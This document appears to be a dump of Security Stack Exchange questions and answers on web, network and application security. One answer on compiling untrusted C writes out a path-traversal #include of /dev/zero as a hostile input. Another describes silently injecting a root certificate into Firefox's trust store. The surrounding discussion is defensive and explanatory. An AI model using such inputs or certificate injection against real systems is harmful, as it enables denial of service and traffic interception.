<p>If you look at it, the arguments in this question could be equally applied to Java applets. Or Flash. Or PDF embedding. Or images (CSRF). Or cookies. For example, other sites can CSRF you via images. It's up to you to make sure that your  site isn't vulnerable to these.</p>
","31240"
"Grey vs Green padlock in address bar - technical difference","16625","","<p>What is a technical difference between ""grey padlock"" and ""green padlock"" in URL bar in browsers?</p>

<p><img src=""https://i.stack.imgur.com/sYTnc.jpg"" alt=""enter image description here""></p>

<p>As an example we can take:</p>

<ul>
<li>Green padlock: <a href=""https://www.bankofamerica.com/"" rel=""nofollow noreferrer"">Bank of America</a></li>
<li>Grey padlock: <a href=""https://www.google.pl/search?q=cat"" rel=""nofollow noreferrer"">Google Search</a></li>
</ul>

<p>Both of them are signed by proper CAs.</p>

<p>So my questions are:</p>

<ul>
<li>What is a technical difference?</li>
<li>How does it impact my browsingsecurity?</li>
<li>Are there some best practises what shouldn't be done on pages with ""grey padlock""?</li>
</ul>
","<p>In Firefox, a grey padlock indicates that the site in question does not use an EV certificate. Sites using EV certificates shows up as a green padlock.</p>

<p>There is mostly no practical difference between the two types of certificates. Both are equally secure from a technical POV. For a more thorough answer about EV certificates, see <a href=""https://security.stackexchange.com/questions/15865/what-are-the-advantages-of-ev-certificate"">What are the advantages of EV Certificate?</a></p>
","47322"
"What do I need to do to secure log-in and registration for my website?","16611","","<p>What security features do I need to have in-place to ensure that my website log-in and registration forms are secure? </p>
","<p><strong><a href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"">CSRF</a></strong> - You need to have protection in place to prevent cross site request forgery - or requests to login, signup, or other actions from other sites. This can be used to trick users into performing actions they didn't intend to.</p>

<p><strong><a href=""http://en.wikipedia.org/wiki/CAPTCHA"">CAPTCHA</a> on signup</strong> - It's often recommended to use a CAPTCHA on your sigh-up form to reduce automated signups. How important this is depends on your threat model.</p>

<p><strong>Secure login</strong> - The login needs to happen over HTTPS to reduce the risk of the user's credentials being captured via a <a href=""http://en.wikipedia.org/wiki/Man-in-the-middle_attack"">MiTM</a> attack.</p>

<p><strong>Cookies</strong> - While login over HTTPS should be seen as a minimum, everything else really should be over SSL as well to protect the cookies (remember <a href=""http://en.wikipedia.org/wiki/Firesheep"">Firesheep</a>?). Though just using SSL isn't enough, you need to set the <a href=""https://www.owasp.org/index.php/SecureFlag"">Secure</a> flag and <a href=""https://www.owasp.org/index.php/HttpOnly"">HttpOnly</a> flag whenever possible.</p>

<p><strong>Email Confirmation</strong> - You need to make sure that you verify a user's email address as part of the sign-up process (I'd suggest not letting them login until it's confirmed). You'll need to have this for use in password resets. </p>

<p><strong>Bruteforce protection</strong> - You need to protect against an attacker bruteforcing user accounts. There are various ways to do this, locking accounts (which can be used as a <a href=""http://en.wikipedia.org/wiki/Denial-of-service_attack"">DoS</a> attack by locking out large number of users), limiting failed attempts from a given IP (either via ban, or additional CAPTCHA). There are pros and cons to each method, but it's important that you have some form of protection in place.</p>

<p><strong>Secure password reset</strong> - You need to make sure that you have a secure method for resetting passwords. This one is more complicated than most people think, and is easy to get wrong (<a href=""http://arstechnica.com/security/2013/03/apple-suspends-password-resets-after-critical-account-hijack-bug-is-found/"">as Apple recently found</a>). The biggest risk is that an attacker finds a way to abuse the feature to reset accounts that they don't own.</p>

<p>I'd strongly suggest that you read the OWSAP <a href=""https://www.owasp.org/index.php/Authentication_Cheat_Sheet"">Authentication Cheat Sheet</a>, it goes into detail on these and many other potential issues; and as always, when building new systems, it's a good time to take another look at the <a href=""https://www.owasp.org/index.php/Top_10_2010-Main"">OWASP Top 10</a> and make sure you have taken the proper precautions.</p>
","33592"
"Regulations that specify password length?","16609","","<p>I have read: </p>

<ul>
<li>PCI DSS 1.2</li>
<li>SOX 404</li>
<li>AR 25-2 </li>
<li>ISO 27001</li>
</ul>

<p>But only PCI DSS specifies a minimum password length. </p>

<p><strong>Are there any other regulations that dictate password lengths for any industry?</strong> </p>

<p>NIST documents talk about the impacts of certain lengths and complexities [NIST SP 800-63b now provides guidance on password length]. OWASP, SANS, and others give their opinions on password minimums, but they couldn't be considered official. </p>

<p>Not looking for recommendations or impacts of various lengths, but actual regulations that require a certain length. For the purposes of this question, it doesn't even matter if the regulations are good or not, just some regulatory body saying that passwords must be at least a certain length. </p>
","<p>I believe the National Institute of Standards and Technology (NIST) publishes the United States Government Configuration Baseline (<a href=""http://usgcb.nist.gov/usgcb_content.html"">USGCB</a>, formerly known as Federal Desktop Core Configuration or FDCC) <a href=""http://web.nvd.nist.gov/view/ncp/repository/checklist/download?id=898&amp;cid=1"">checklists</a>, which specify the password complexity, lifetime, and history requirements for U.S. federal organizations.  Also, the Center for Internet Security (CIS) publishes Benchmarks for various platforms, which include similar recommendations.</p>

<p>Between the two, the highest mark is:</p>

<ul>
<li>12 characters minimum.</li>
<li>At least three character types.</li>
<li>Expiration in 60 days.</li>
<li>Minimum lifetime of 1 day.</li>
<li>No reuse within 24 passwords.</li>
<li>Some OS-specific additional requirements may be applied.</li>
</ul>

<p>Those settings are applied at the OS level.  I'm not sure if either organization has similar specifications specifically targeting applications or websites, but most organizations which are subject to these will probably just use the same requirements as they do in the OS.</p>

<p>A Google search for any of the above terms should turn up a wealth of information.  (I may add links here myself later, or anyone else is free to edit them in.)</p>
","11100"
"Preventing artificial latency or ""Lag Hacking"" in multiplayer games","16597","","<p>There is an attack that some people have dubbed ""lag hacking"", and its gaining popularity in multiplayer games.  There are at-least two ways of creating <a href=""http://en.wikipedia.org/wiki/Cheating_in_online_games#Artificial_lag"">artificial latency</a>. One method of introducing artificial latency is using a <a href=""http://www.youtube.com/watch?v=5gE-ihY_EG0"">lag switch</a>,  where the user intentionally disconnects their network cable.   Another method is using a flood of syn or udp packets to cause controlled and predictable disruption in the game so that a player can gain an unfair advantage.  Artificial latency attacks <a href=""https://www.youtube.com/results?search_query=lag%20hack&amp;oq=lag%20hack&amp;gs_l=youtube.3..0l2j0i5l4.183511.184364.0.184493.8.8.0.0.0.0.150.789.3j4.7.0...0.0...1ac.1.OJJUw8bBodQ"">affect a <strong>large</strong> number of multiplayer games</a>. </p>

<p>Some game companies have been made aware of this attack by their users,  <a href=""http://www.reddit.com/r/leagueoflegends/comments/zna7u/the_truth_about_the_loldrop_hack/"">but are ignoring this vulnerability because they don't have a solution</a>.  The tools to carry out this attack are simple to construct,  <a href=""https://www.youtube.com/watch?v=MPcixyXc4Fc"">readily available and easy to use</a>.  They will often spoof the source IP address to make the attack difficult to trace.</p>

<p>So security.se, lets come up with a solution to this problem.  But first lets talk a bit about game protocols.  Online games commonly use UDP due to decreased latency and overhead,  but this also increases the susceptibility to spoofing.  Game protocols can use <a href=""http://www.gamedev.net/page/resources/_/technical/multiplayer-and-network-programming/targeting-a-variation-of-dead-reckoning-r1370"">Latency Hiding</a> to decrease the ""perceived latency"",  but this may increase the impact of artificial lag.  Multiplayer games often use a p2p architecture, for example <a href=""https://sites.google.com/site/hydrap2p/"">Hydra: Peer-to-Peer architecture for games</a>, and a peer is easy to flood.   The <a href=""http://udn.epicgames.com/Three/NetworkingOverview.html"">Unreal network architecture</a> is well documented, and  is <a href=""https://www.youtube.com/results?search_query=unreal%20lag%20hack&amp;oq=unreal%20lag%20hack&amp;gs_l=youtube.3...1182345.1183094.0.1183207.7.6.0.0.0.3.151.568.4j2.6.0...0.0...1ac.1.S_pRt72uOvE"">also vulnerable to this attack</a>. (If there is another resource I should list,  let me know!)</p>
","<p>I see two conceptual paths for dealing with lag attacks:</p>

<ol>
<li><p><strong>Punish lags</strong>. When an ""artificial"" lag is detected, evict the offender and enforce a ban period. This is hard to do in practice because there is a delicate balance to be found between people who cheat through lagging, and people who simply suffer from an occasional hiccup in their Internet connection. It is bad business practice to smite your own customers. Such kinds of solutions will necessarily end up with a threshold to distinguish between bad people and unlucky people. Cheaters will stick close to the threshold and this will probably be sufficient to gain some strategic advantage.</p>

<p>One promising approach along the punishment line is to apply small but cumulative penalties for each lag: whenever a packet is lost or shows up late, remove one hit point, make the player flash, whatever... this can even be integrated in the game universe (for instance, for a <a href=""http://en.wikipedia.org/wiki/First-person_shooter"">FPS</a> convert the detected lag into a rifle jam). This implies that people with reliable Internet connections and big computers will be at an advantage -- and I believe that players are ready to accept that, on the basis that similar things happen in a lot of other leisure-competition situations (e.g. if your hobby is skateboarding, you know that a better skateboard will not replace talent, but will help nonetheless, and skateboarder accept that as a fact of life). Ultimately, this might incite ISP to work a bit on their latency, which would be good for <em>everybody</em>, not just gamers.</p></li>
<li><p><strong>Don't trust clients</strong>. Massively online games are <a href=""http://en.wikipedia.org/wiki/Distributed_computing"">distributed computing</a>. Most of their security issues are due to the fact that many game rules, i.e. the properties of the world in which the players act, are maintained by the client systems. The players themselves, and in particular the potential cheaters, have extensive control of their machines. Existing <a href=""http://www.punkbuster.com/"">countermeasures</a> tend to have limited effectiveness for the same reasons that software DRM and antivirus may fail: this is an arms race in which attackers and defenders are locked into a fast-paced battle of patches and counterpatches which is tiresome and requires expensive, continued maintenance.</p>

<p>The generic architectural response is to maintain the game rules server-side only; clients become ""thin"" and are just display interfaces. This is unfortunately hard to implement, because display performance (hence game experience) becomes very sensitive to latency, artificial and natural alike; and <a href=""http://en.wikipedia.org/wiki/Asymmetric_digital_subscriber_line"">ADSL links</a> will have a minimal latency close to 50 ms, which is high with regards to average gamer reflexes. Also, this means that the game <em>servers</em> need more CPU muscle. But the security advantage is huge: when a player induces lagging, he inherently punishes himself and none other.</p>

<p>Maintaining all game state and rules on the servers is not completely science-fiction either. Back in the late 1980s, one of the very first <a href=""http://en.wikipedia.org/wiki/Massively_multiplayer_online_game"">MMO</a> games was ""CarCrash"", an offspring of the defunct French magazine <a href=""http://fr.wikipedia.org/wiki/Jeux_et_Strat%C3%A9gie"">Jeux et Stratégie</a>; it was played over the <a href=""http://en.wikipedia.org/wiki/Minitel"">Minitel</a>, another old French technology where users simply had text terminals (with limited graphics) with no local computing abilities; the central server(s) maintained the game rules and computed the screen updates for everybody, and it worked. Computers at that time had far less CPU muscle than today; a 20 MHz CPU was enough to be deemed a ""supercomputer"". A 35$ home router of 2013 is more than ten times as powerful as a big server of that era. And yet it worked.</p>

<p>Maintaining game rules on the server implies departing from the way games are usually architectured. Historically, most games were local and became multiplayer by connecting clients with each other, with possibly a central server which only served as rendez-vous point. To take a political metaphor, games became multiplayer by forming <a href=""http://en.wikipedia.org/wiki/Confederation"">confederations</a>, but security against cheaters requires a <a href=""http://en.wikipedia.org/wiki/Federation"">federation</a>.</p></li>
</ol>

<p>Mixed strategies are possible, of course. The core idea is the same: <strong>give as few  sensitive data as possible to client systems; and when you <em>must</em> trust them for something, use a big stick or a big carrot to maintain them in line</strong>.</p>

<p>(If you understand that players should be handled like cattle herds, well,... there is truth in that, indeed. You don't want your cows to be unhappy, but you will not let them choose their walking direction and pace either.)</p>

<hr />

<p><strong>Edit:</strong> just got an insight while waiting for my tea to cool a bit. A game architecture could include several (possibly dozens) of cooperating ""trusted"" servers spread worldwide, which ""play the game"" like game clients do today. Each gamer would connect to one server which is ""close by"" (in a network sense) so as to have a low latency, allowing for the display-only strategy outlined above. If ISP themselves can be involved in the deal (each ISP would host a few servers in its own infrastructure) then this could make sense in a business way.</p>
","31334"
"What is the website checking about my browser to protect the website from a DDoS?","16590","","<p>Some sites I visit take me to a page that says roughly, ""Checking your browser before accessing example.com. DDoS attack protection by CloudFlare"".</p>

<p>What exactly about my browser is being checked and how will that help protect against a DDoS attack?</p>

<p><a href=""https://i.stack.imgur.com/8CIiP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/8CIiP.png"" alt=""Automatic DDoS protection from CloudFlare""></a></p>
","<p>Most Denial-Of-Service (DOS) attacks rely on some asymmetry between the resources involved on attacker side and on target side. In other words, to be successful, a DOS needs an action to require very few resources client-side (so the each clients can send a lot of requests) while involving larger resources server-side (so the server(s) will be unable to handle the load).</p>

<p>Due to this, DDOS attacks (the ""Distributed"" version of DOS attacks) are obviously not engaged by real humans clicking on links in a browser tab, but by bots sending massive amount of parallel requests to the target. The consequence of this is that the DDOS ""client"" is not a real browser, but a tool which may more-or-less simulate one.</p>

<p>Cloudflare DDOS protection system is <a href=""https://www.cloudflare.com/ddos/"" rel=""noreferrer"">quickly described</a> on their website as follow: <em>""an interstitial page is presented to your site’s visitors for 5 seconds while the checks are completed""</em>.</p>

<p>Two things trigger my attention here:</p>

<ul>
<li><p><em>The checks</em>: the most obvious way to sort real website users from automatic DDOS bots is to check whether the HTTP client is a real browser or not. This can go through testing the client's behavior against a panel of tests (see the post <em>""<a href=""https://security.stackexchange.com/q/71869/32746"">bot detection via browser fingerprinting</a>""</em> for instance) and compare the result with the one expected from a genuine instance of the browser the client claims to be (for instance if the client claims to be a Firefox version 52 running on a Windows 10 machine, does it present the same characteristics?).</p></li>
<li><p><em>5 seconds</em>: Executing JavaScript tests and redirecting the visitor could be a very fast and almost transparent operation, so I believe that this ""5 seconds"" timeout is not there by accident but is meant to revert the computational asymmetry back in favor of the server.</p>

<ul>
<li><p>The most light version of such principle would simply be to ask the client to wait (sleep) 5 seconds before resubmitting the same request (with a unique identifier stored in a cookie, as described on Cloudflare page). This would force the DDOS client to somehow handle a queue of pending redirections, and would finally make the overall DDOS process less effective.</p></li>
<li><p>A more brutal alternative would be to request the browser to solve some mathematical challenge which would require a few seconds to be solved on an average home system. In such a case, attackers would have no other choice than spend computational power to solve these challenges if they would like to proceed, but doing so will completely void the asymmetry since all the attacker's resource will be busy in solving challenges instead of sending requests, finally ""DOSing"" the attacker's system instead of the target's one.</p></li>
</ul></li>
</ul>
","154979"
"Should I disable http HEAD requests?","16567","","<p>I have seen increased 'HEAD' requests in my webserver access.log. What are these requests for? Should I disable this method in my webserver configs?</p>
","<p><a href=""http://en.wikipedia.org/wiki/HTTP_HEAD#Request_methods"">No.</a></p>

<p>Relevant quote from the link:</p>

<blockquote>
  <p><strong>HEAD</strong></p>
  
  <p>Asks for the response identical to the one that would correspond to a GET request, but without the response body. This is useful for retrieving meta-information written in response headers, without having to transport the entire content.</p>
</blockquote>

<p>If you disabled it, you'd just increase your throughput cost. A person can get the same information with a GET, so if they were trying to do something malicious, they could just use a GET. Except, this way, they're being nice and not forcing you to send the request body.</p>

<p><strong>EDIT:</strong> I don't know what the requests would be from, although I can certainly think of uses. Anyone else who knows or wants to chip in, please do so. I'm kinda curious, myself. Hence, community wiki.</p>
","62812"
"Why is Steam so insistent on security?","16564","","<p>Is there any particular reason why the <a href=""http://steamcommunity.com"">Steam</a> application attempts to be so secure? It seems to force you to take more security measures (two-factor authentication, emails confirming all trades, etc) than most banks do.</p>

<p>Is this due to the fact that the Steam software has some inherent security risks associated, or is it just because they want to avoid people complaining that their account was hacked?</p>

<p>Is there any reason that Steam attempts to be more secure than most banks?</p>
","<p>Steam has about 100 million users (<a href=""http://www.engadget.com/2014/01/15/steam-has-75-million-active-users-valve-announces-at-dev-days/"" rel=""noreferrer"">random link saying they had 75 million almost 2 years ago</a>). If they spend on average $10 per year, we're talking $1,000,000,000 per year - and I'd say that's a conservative estimate (<a href=""http://www.maximumpc.com/steam-scorches-to-nearly-1-billion-in-revenue/"" rel=""noreferrer"">random link saying they had 1 billion in revenue back in 2010</a>). <strong>That's the same kind of money small banks deal with</strong>.</p>

<p>Then there is almost certainly <strong>a large number of low tech attackers</strong>. Steam is used by a lot of kids who don't yet have a proper understanding of legality, so at least some of them will try to steal the account of that other kid that smells funny. To be clear: ""some"" of 100 million is ""lots"".  These attackers often live in the same town and maybe even saw the other kid typing in the password before, which breaks some traditional safeties based on IP range and passwords. Stolen accounts create customer support costs. Widespread reports of stolen accounts create bad press, which destroys trust. For a digital market, trust is money.</p>

<p>Valve also works with a huge number of partners. These <strong>partners can act maliciously and try to break/abuse the billing process</strong>, which will directly hurt Steam's reputation and therefore lose Valve some serious money, unless the abuse is detected and dealt with swiftly.</p>

<p>EDIT: </p>

<blockquote>
  <p>[...] enough money now moves around the system that stealing virtual Steam goods has become a real business for skilled hackers [...] We see around 77,000 accounts hijacked and pillaged each month. - 9 Dec 2015 <a href=""http://store.steampowered.com/news/19618/"" rel=""noreferrer"">http://store.steampowered.com/news/19618/</a></p>
</blockquote>

<p>So in addition to a large number of low tech attackers, there's a large number of high tech attackers as well.</p>
","106927"
"Writing my own encryption algorithm","16557","","<p>I am currently studying IT at college (UK college aka not University) and the coursework is boring me to death. I have been coding for quite a while now mainly in OO languages such as C# and Java but often get bored and give up quickly because the majority of it is boring UI stuff I hate doing, the projects I come up with rarely have much to do with code design and actually creating algorithms. I want to start writing my own algorithms of sorts and start moving away from the user friendliness side and start learning things that interest me, namely cryptography and compression. I want to write my own encryption algorithm, to encrypt the bytes of a file or string. I have a few questions:</p>

<ul>
<li>Where would I start with this, What books/materials are recommended
for starting with cryptography?</li>
<li>Do I need extensive cryptography knowledge to get started on a basic
algorithm?</li>
<li>Will C# be OK for putting an encryption algorithm into practice?</li>
</ul>

<p>Any help would be sincerely appreciated. I want to start writing code so when it comes to applying to uni, I have something to show for all of my bold claims on my application!</p>
","<p>Of course you can start small and implement your own algorithms. But <strong>do not assume they provide any security beyond obfuscation</strong>.</p>

<p>The difficult thing when it comes to cryptography is finding reasons why something actually <em>is</em> secure. You won't be able to decide that within months and if you feel like you are at that point, you are most probably wrong.</p>

<p>It is much easier to find reasons why things are insecure than reasons why they are secure, so if you want to start somewhere, develop your own algorithms until you think they are secure and then try to find out why they are not and find ways to attack them.</p>

<p>Most mistakes are made when implementing algorithms. So if you want to get a well paid job you could learn how to implement that stuff correctly.</p>

<p>I would recommend starting to implement something like AES and than continue to different operation modes like CBC or CCM and find out why randomness is important. Continue with SHA-2 and HMAC and proceed to asymmetric cryptography. Always check what others did and why they did it and have a special look at side channel attacks and how they are performed. If you are at that point you will find your way to go on.</p>

<p><strong>The</strong> reference to start with would be the ""HAC"", which is freely available online: <a href=""http://cacr.uwaterloo.ca/hac/"">http://cacr.uwaterloo.ca/hac/</a></p>

<p><strong>[Edit]</strong>
A suggestion from JRsz which shall not be buried in the comments. A good book for beginners: <a href=""http://crypto-textbook.com/"">http://crypto-textbook.com/</a></p>
","106196"
"Why is ARP poisoning killing all network activity?","16551","","<p>Using ettercap and ARP poisoning, I was able to eavesdrop on other connections, but suddenly I was unable to make any connection to the Internet.  To restore Internet connectivity, I had to restart my router. (I have tested this on 3 different routers: sagem, linksys and huawei.)</p>

<p>Am I doing something wrong or is there a safety mechanism that kills all network activity?</p>
","<p>ARP spoofing usually works by fooling all the clients into thinking that you're the router, by faking the ARP responses that translate IP addresses to MAC addresses. When clients receive the ARP response, they remember the MAC that was associated with the IP.</p>

<p>Once you stop the application that's handling the man-in-the-middle part of the operation, the clients keep sending to your MAC address, instead of the router's. Since you're no longer handling such packets, the traffic is blackholed and the whole network goes down. Resetting the router causes it to send an ARP broadcast (e.g. ""Hi, I'm <code>192.168.1.1</code> at <code>12:34:56:78:90:AB</code>"") along with a DHCP broadcast, allowing clients to re-sync with the real router.</p>

<p>It may be possible for your ARP poisoning software to send out an ARP broadcast when it closes, with the real MAC address of the router, in order to prevent this. This may be a bug, or it may just not be implemented yet.</p>
","19642"
"Is it dangerous to compile arbitrary C?","16510","","<p>I have a small server and I would like to check compile times on C programs provided by users.  The programs would never be run only compiled.  </p>

<p>What risks are there to allowing users to compile arbitrary C using gcc 5.4.0?</p>
","<p>A bit of a weird one, but: it's a denial-of-service risk, or potential information disclosure. </p>

<p>Because C's preprocessor will cheerfully include any file specified in an <code>#include</code> directive, somebody can <code>#include ""../../../../../../../../../../dev/zero""</code> and the preprocessor will try to read to the end of <code>/dev/zero</code> (good luck). </p>

<p>Similarly, especially if you let people see the output of their compilation attempts, somebody could try including various files that may or may not be present on your system, and could learn things about your machine. Combined with clever usage of <a href=""https://gcc.gnu.org/onlinedocs/gcc-3.3/cpp/Pragmas.html""><code>#pragma poison</code></a>, they <em>might</em> even learn things about the file contents even if you don't provide full error messages.</p>

<p>Relatedly, pragmas can alter a lot of preprocessor, compiler, or linker behavior, and are specified in source files. There's <em>probably</em> not one that lets somebody do something like specify the output file name or something like that, but if there is, it could be abused to override sensitive files, or get itself executed (by writing into cron or similar). There might be something similarly dangerous. You really should be careful about compiling untrusted code.</p>
","138887"
"Why does Firefox claim that my connection to Google is insecure?","16411","","<p>I keep receiving this message whenever I open any site from Google:</p>

<p><a href=""https://i.stack.imgur.com/fqauu.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/fqauu.png"" alt=""""></a></p>

<p>My Firefox is up-to-date, and so my Windows 8.1. Since I don't know much about HSTS, I don't know what's going on, and obviously, I can't google it.</p>

<p>Using a VPN doesn't solve the problem. I am using Kaspersky Antivirus.</p>
","<p>Kaspersky, like most AV products these days, is performing a local MITM against your secure HTTP traffic. It does this in order to be able to scan payloads in HTTP transactions, be it in the request or the response.</p>

<p>In order for this to be done correctly, Kaspersky has to generate its own root CA certificate, and generate spoofed certificates on the fly, feeding them to your browser. Kaspersky also has to install this CA into your operating system's Trusted Certificate store. </p>

<p>The reason why it needs to install it into the OS certificate store is because this is where most software looks to validate that the Certificate Authority who has issued the certificate it has received is a valid, trusted Authority. If that authority is not there, boom, you get this error.</p>

<p>FireFox is the only mainstream web browser that is paranoid. It refuses to trust your OS's cert store, precisely because its so easy to simply install a fake CA into it and start MITM'ing peoples connections. Instead, FireFox is distributed with a <a href=""https://github.com/bagder/ca-bundle"" rel=""noreferrer"">complete list</a> of all CAs that Mozilla trusts. </p>

<p>What's cute about this is that it's not actually adding any security whatsoever. You can simply compile the open source <a href=""https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS"" rel=""noreferrer"">Mozilla NSS</a> package and, included in it is a utility called CertUtil that can transparently inject certificates, even root CAs, into FireFox's trusted cert store. This does not require the user to accept it, nor does it even alert the user that this has happened. You can see how easy this is to do in a C# function I wrote <a href=""https://github.com/TechnikEmpire/StahpIt-WPF/blob/master/Stahp%20It/App.xaml.cs#L1026"" rel=""noreferrer"">here</a>.</p>

<p>So what's happening here is that Kaspersky is not properly MITM'ing FireFox, so when FireFox gets fed certs issued by Kaspersky's CA, it's throwing all the alarms and screaming at you that you're under attack.</p>
","119639"
"Android/iOS application security testing checklist","16370","","<p>According to OWASP, we have a list of <a href=""https://www.owasp.org/index.php/OWASP_Mobile_Security_Project#tab=Top_10_Mobile_Risks"">top ten mobile application vulnerabilities</a>. </p>

<p>But we are damn sure that the number of vulnerabilities on mobile apps, especially android apps are far more than listed here. And also I couldn't find a comprehensive checklist for either android or iOS penetration testing anywhere in the internet. If anyone have such a list with mobile application vulnerabilities and their testing methodologies please share here. Anything like a link to any such sources are also entertained.</p>
","<p>There is a project called OASAM that aims to define a methodology to test Android devices.</p>

<p>You can find it here: <a href=""http://oasam.org/en"">http://oasam.org/en</a></p>

<p>The guide has the following sections:</p>

<ol>
<li>OASAM-INFO:  Information Gathering:  Information gathering and attack surface definition.</li>
<li>OASAM-CONF: Configuration and Deploy Management: Configuration and deploy assessment.</li>
<li>OASAM-AUTH: Authentication: Authentication assessment.</li>
<li>OASAM-CRYPT:  Cryptography: Cryptography use assessment.</li>
<li>OASAM-LEAK: Information Leak: Confidential information leak assessment.</li>
<li>OASAM-DV: Data Validation:User entry management assessment.</li>
<li>OASAM-IS: Intent Spoofing: Intent reception management assessment.</li>
<li>OASAM-UIR: Unauthorized Intent Receipt:Intent resolution assessment.</li>
<li>OASAM-BL Business Logic: Application business logic assessment.</li>
</ol>
","73585"
"Is Ghostery safe to use?","16340","","<p>I've heard about Ghostery, a browser extension/plugin that blocks web trackers.  But according to <a href=""http://lifehacker.com/ad-blocking-extension-ghostery-actually-sells-data-to-a-514417864"">this link</a> it sells our data. Are add-ons and plugins open source in Firefox? Is there another alternative to Ghostery?</p>
","<p>You can prevent Ghostery from selling your data by opting out of the Ghost Rank feature. The feature is opt-in, so if you didn't already opt in there is nothing you need to do. It is then safe for you to use. </p>

<p>Using a clone of Ghostery which is identical in every aspect except not having the Ghost Rank feature would make no practical difference from running Ghostery without opting in to Ghost Rank. If your intention is to actively punish Ghostery for their evil data trading by boycotting them, then you will achieve nothing. They already gain nothing from you commercially when you run Ghostery with Ghost Rank disabled. If anything you help them by uninstalling Ghostery because you no longer consume any of their resources.</p>

<p>But if you are really looking for an alternative option: the classical method is to edit your operating systems <code>hosts</code> file and forward the hostnames of known trackers and advertising networks to <code>0.0.0.0</code>. There are recommended blocklists available which you can find with a websearch (I can't vouch for their quality, so I won't recommend any specific ones). The advantage is that it doesn't just block advertisements in one web browser, but in all web browsers you have installed and in any other applications which might access these hosts for whatever reason. The drawback is that you will have to maintain your blocklist manually.</p>
","97987"
"Missing Secure Attribute in Encrypted Session (SSL) Cookie Recheck","16338","","<p>I tested a web application with a commercial tool (IBM AppScan) for penetration test. I found a bug which is related to Missing Secure Attribute in Encrypted Session (SSL) Cookie. </p>

<p>The web application is written in .Net so I have added this content to web config:</p>

<pre><code>&lt;httpCookies requireSSL=""true"" /&gt;
</code></pre>

<p>After that I checked application in browser with the ""Advanced Cookie Manager"" add-on in Firefox. </p>

<p>Results of Advanced Cookie Manager: some attributes IsSecure values are true, some are false. </p>

<p>I want to check to see if this is a false positive - how else can I re-check secure attribute. </p>
","<p>Cookies can be set multiple times which can result in insecure cookie attributes (<code>Secure</code> and <code>HTTPOnly</code>) and race conditions.  Tools can produce false positives,  what really matters is if the browser is using the flag properly.  To viewing the cookie's security attributes within the browser's developer console (ctrl+shft+j).</p>

<p>If the cookie is being set multiple times, the challenge is finding the misconfigured request handler.  Here is the process for tracking down the culprit:</p>

<ol>
<li>Open a new private window in firefox or chrome.</li>
<li>Open the developer console (ctrl+shift+j)</li>
<li>Load the page that is responsible for setting the secure cookie.</li>
<li>Look at every HTTP request that contains a <code>set-cookie</code> HTTP header element. find one that doesn't have the <code>Secure</code> flag.</li>
</ol>
","47883"
"POST over HTTPS ""secure enough"" for sensitive data?","16328","","<p>I'm wondering if to prevent the possibility of a compromised SSL certificate leading to the potential for sensitive information disclosure if it might be prudent to further encrypt data being passed over SSL.</p>

<p>Imaginary scenario: two web applications. One is a web application, the other is an application supplying an authentication API.</p>

<p>The web app sends an HTTPS POST to the authentication API containing username and password. It's encrypted via SSL.</p>

<p>However, couldn't that data be sniffed if an attacker was to compromise the SSL cert?</p>

<p>My thought is to add another level of encryption -- e.g. we have an additional public/private key pair and we encrypt all the information in the POST by that as well.</p>

<p>That would mean that an attacker who had compromised your SSL cert would need to find an additional private key in order to break the communication.</p>

<p>Thoughts?</p>
","<p>Instead of extra encryption, if you <em>must</em> be secure, use two-factor authentication. Make user users enter a user name, a password, and a 6-digit random number sent by email or SMS. A compromised certificate means that the attacker can possibly control the entire SSL payload both directions; including any code you send to the client to perform the encryption required to authenticate with the server.</p>

<p>Also consider separating your application server and your authentication server. This makes it a lot harder for an attacker to do anything useful with an acquired list of usernames and passwords if they are not actually accepted by the application server; this is concept behind OAuth2. It is far easier to recover one server than it is to attack two servers (at least, in theory).</p>
","51070"
"Can Cryptolocker (Or Other Ransomware) Encrypt Files That Are Already Encrypted?","16308","","<p>If you have already encrypted files, are they still vulnerable to being encrypted a second time by a program like Cryptolocker, or would this protect them? </p>
","<p>Yes they are still vulnerable. Encryption just transforms a sequence of bits into another sequence of bits (and assuming the encryption is good it will be computationally infeasible to reverse this process without knowledge of some secret). There's no reason why encryption can't be performed again on an already encrypted sequence of bits.</p>

<p>It's possible certain ransomware implementations might look for specific files that are likely to be of high value, and encrypting these files might make them more difficult to recognise. However, I would not depend on this as my primary control against the threat of ransomware.</p>
","66593"
"Prevent network users from creating an unauthorized outgoing VPN connection to avoid network policies","16298","","<p>Is it possible to prevent network users from creating unauthorized outgoing VPN connections to avoid network policies?</p>

<p>Edit- What is the best way to detect unauthorized outgoing VPN connections while they are in process or after they have occurred? I assume there are software solutions? </p>
","<p>This is a risk-management thing.  As @tylerl mentioned, if the only parameter is to <em>stop</em> people from opening tunnels, then blocking everything is the way to go.</p>

<p>In the real world, you need to weigh the risks and benefits.</p>

<p>I prefer a well communicated Acceptable Use Policy + firewall rules + blacklists + traffic statistics.  It will block the honest and slightly dishonest workers.  For the dishonest techies, look for long open sessions, unusually high amounts of encrypted traffic, or after-hours communications to/from machines in the end-user networks.</p>

<p>You're still open to the risk of people using tunnels for small amounts of data, but they still have USB keys, ipods and cellphones right?</p>
","11126"
"Why is JavaScript disabled in the Tor Browser Bundle?","16274","","<p>Didn't Tor create a local socks proxy? Why doesn't all the Web traffic go over this local socks proxy and why is JavaScript disabled in the Tor Browser bundle?</p>

<p>If you would connect with firefox for example to a normal socks proxy, could javascript still reveal my real ip?</p>
","<p><strong>Short answer: JavaScript isn't a threat per se, but it can become one. So disable it in critical situations just in case.</strong></p>

<p>JavaScript is <a href=""https://www.torproject.org/docs/faq.html.en#TBBJavaScriptEnabled"">globally enabled in Tor Browser Bundle by default</a>. JavaScript, per se,  won't reveal your IP address, it's just that many times there are security problems with the JavaScript components in your browser that would allow evil people to execute malicious code on your computer. That malicious code <a href=""http://www.v3.co.uk/v3-uk/news/2287823/fbi-tor-exploit-appears-on-metasploit-penetration-tester-forum"">can reveal your IP address, MAC address, and a lot more information</a>.</p>

<p>You use Tor to protect your privacy, so you'd want minimize the risk as much as possible. That's why you disable JavaScript, Flash, Java, and other components. You don't disable them because they'll compromise you all the time, you disable them just in case, which is a good practice in situations where you want to be careful about your privacy and identity.</p>

